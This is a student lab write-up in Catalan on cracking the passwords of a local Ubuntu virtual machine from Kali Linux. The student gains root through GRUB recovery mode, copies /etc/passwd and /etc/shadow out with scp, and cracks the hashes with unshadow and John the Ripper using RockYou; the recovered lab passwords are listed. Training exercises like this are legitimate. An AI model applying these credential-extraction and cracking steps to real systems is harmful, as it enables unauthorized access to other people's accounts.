# NF1AA3 - Activitat Cracking de Contrasenyes

# 1. Configuració de l'entorn

Per realitzar l'activitat s'han utilitzat les següents màquines virtuals:

- Ubuntu Server amb laes contrasenyes a descubrir (ova)
- Adaptador de xarxa: Xarxa NAT

![](/Activitat%20Cranking/media/1.png)

- Kali Linux
- Adaptador de xarxa: Xarxa NAT

![](/Activitat%20Cranking/media/2.png)

---

# 2. Obtenció d'accés a la màquina víctima

El Primer es accedir al grub de la mv i anem a opcions avançades i a la opcio de recovery mode.

![](/Activitat%20Cranking/media/3.png)

Un cop inici el menu de recuperacio anem esperem i quan s'acabi tot anem li donem a enter i ja esterem en root.

---

# 3. Obtenció de les adreces IP

Per verificar la connectivitat entre les màquines s'ha de mirar la ip de Kali per fer el enviament amb scp.


## IP de Kali

```bash
ip a
```

![](/Activitat%20Cranking/media/4.png)

---

# 4. Transferència dels fitxers a Kali

Des de la màquina Ubuntu s'han transferit els fitxers `passwd` i `shadow` a Kali mitjançant SCP.

Exemple de les comandes utilitzades:

```bash
scp /etc/passwd usuari@IP_KALI:.
scp /etc/shadow usuari@IP_KALI:.
```

![](/Activitat%20Cranking/media/5.png)

I com he posat a home ja els tinc

![](/Activitat%20Cranking/media/6.png)

Per poder utilitzar John the Ripper és necessari combinar la informació dels fitxers `passwd` i `shadow`.

S'ha utilitzat la següent comanda:

```bash
unshadow passwd shadow > passwords-quico
```

![](/Activitat%20Cranking/media/7.png)

Ara hem de descomprimir un diccionari de contresenyes de kali el rockyou.

![](/Activitat%20Cranking/media/8.png)

---

# 5. Anàlisi de les contrasenyes

---

## 5.1 Atac en mode Single

Primer s'ha executat el mode bàsic.


![](/Activitat%20Cranking/media/9.png)

---

## 5.2 Atac amb diccionari

Posteriorment s'ha realitzat un atac de diccionari utilitzant RockYou.

![](/Activitat%20Cranking/media/10.png)

---

## 5.3 Atac de força bruta

Amb Aquest atac l'hem pogut fer tot i que la ultima contrasenya que faltava de l'usuari scarlet no l'hem trobat degut a que l'atac de força brtua es lent i mes si estem en una mv aixi que aquest a sigut el problma pero l'atac l'hem pogut fer.

![](/Activitat%20Cranking/media/11.png)

---

# Provem les contrasenyas a la maquina victima

# Usuari: gru 

Contasenya: gru

![](/Activitat%20Cranking/media/12.png)

# Usuari: bob 

Contasenya: password

![](/Activitat%20Cranking/media/13.png)

# Usuari: kevin 

Contasenya: 123456

![](/Activitat%20Cranking/media/14.png)

# Usuari: stuart

Contasenya: P@ssw0rd

![](/Activitat%20Cranking/media/15.png)

# Usuari: herb

Contasenya: love2006

![](/Activitat%20Cranking/media/16.png)

# Usuari: scarlet

Contasenya: no trobada


